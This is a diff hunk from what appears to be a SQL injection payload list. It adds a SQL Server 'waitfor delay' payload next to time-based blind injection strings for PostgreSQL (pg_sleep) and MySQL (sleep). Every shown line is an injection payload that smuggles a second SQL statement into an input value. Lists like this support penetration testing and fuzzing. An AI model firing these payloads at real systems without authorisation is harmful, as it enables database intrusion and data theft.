@@ -98,3 +98,4 @@ pg_sleep(5) —-
 ') OR 11=(SELECT 11 FROM PG_SLEEP(6))--
 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
 if(now()=sysdate(),sleep(20),0)
+132'; waitfor delay '0:0:6' -- 
